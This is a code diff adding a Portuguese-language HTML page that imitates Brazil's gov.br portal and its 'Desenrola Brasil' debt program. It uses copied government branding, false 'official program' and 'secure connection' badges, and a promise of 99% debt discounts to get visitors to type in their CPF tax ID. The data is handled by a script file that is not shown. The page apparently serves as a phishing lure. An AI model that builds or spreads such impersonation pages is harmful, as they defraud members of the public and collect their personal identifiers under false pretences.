@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Limpe seu Nome - Desenrola Brasil</title>
+  <meta name="description" content="Consulte seu CPF e renegocie suas dívidas com descontos de até 99% no Programa Desenrola Brasil oficial.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700;900&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="consulta.css">
+</head>
+<body>
+
+  <!-- Top bar gov.br -->
+  <header class="govbr-header">
+    <div class="header-inner">
+      <img src="logo-portal.webp" alt="gov.br" class="govbr-logo-img">
+      <div class="header-icons">
+        <button type="button" class="header-icon-btn" id="btn-contrast" title="Alto Contraste" aria-label="Contraste">◐</button>
+        <button type="button" class="header-icon-btn" id="btn-reload" title="Recarregar página" aria-label="Recarregar">↻</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Container -->
+  <main class="main-wrap">
+    <section class="card-box" aria-label="Formulário de Consulta de CPF">
+      <!-- Logo Limpe seu Nome -->
+      <div class="logo-wrap">
+        <img src="programa-logo.png" alt="Limpe seu Nome e Desenrola, Brasil!" class="logo-limpe" width="200">
+      </div>
+
+      <!-- Update Badge -->
+      <div class="update-badge">
+        <span class="badge-icon">✅</span>
+        <div class="badge-text">
+          <strong>ATUALIZADO</strong> - Informe seu CPF e clique em "Continuar" para renegociar suas dívidas com descontos de 99%
+        </div>
+      </div>
+
+      <!-- CPF Form -->
+      <form id="cpfForm" class="cpf-form" onsubmit="event.preventDefault(); submitCPF();">
+        <label class="cpf-label" for="cpfInput">CPF</label>
+        <input 
+          type="tel" 
+          id="cpfInput" 
+          name="cpf" 
+          class="cpf-input" 
+          placeholder="000.000.000-00" 
+          maxlength="11" 
+          autocomplete="off" 
+          inputmode="numeric" 
+          required
+        >
+        <span class="error-msg" id="cpfError">CPF inválido. Verifique e tente novamente.</span>
+
+        <!-- Action Button -->
+        <button type="button" class="btn-continuar" id="btnContinuar" onclick="submitCPF()">
+          <span id="btnText">Continuar</span>
+          <div class="spinner" id="btnSpinner"></div>
+        </button>
+      </form>
+
+      <!-- Info Box -->
+      <div class="info-box">
+        <div class="info-icon" aria-hidden="true">i</div>
+        <p class="info-text">
+          O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!
+        </p>
+      </div>
+
+      <!-- Trust Badges -->
+      <div class="trust-row">
+        <div class="trust-item">
+          <span class="trust-icon">🔒</span> Conexão segura
+        </div>
+        <div class="trust-item">
+          <span class="trust-icon">🛡️</span> Programa oficial
+        </div>
+      </div>
+
+      <p class="rights-subtext">Sistema de Renegociação — Todos os direitos reservados</p>
+    </section>
+  </main>
+
+  <!-- Dark Footer gov.br -->
+  <footer class="govbr-footer">
+    <div class="footer-inner">
+      <div class="footer-logo">gov<span>.</span>br</div>
+      <p class="footer-license">Todo o conteúdo deste site está publicado sob a licença</p>
+      <p class="footer-rights">Sistema de Renegociação — Todos os direitos reservados</p>
+    </div>
+  </footer>
+
+  <script src="consulta.js"></script>
+</body>
+</html>
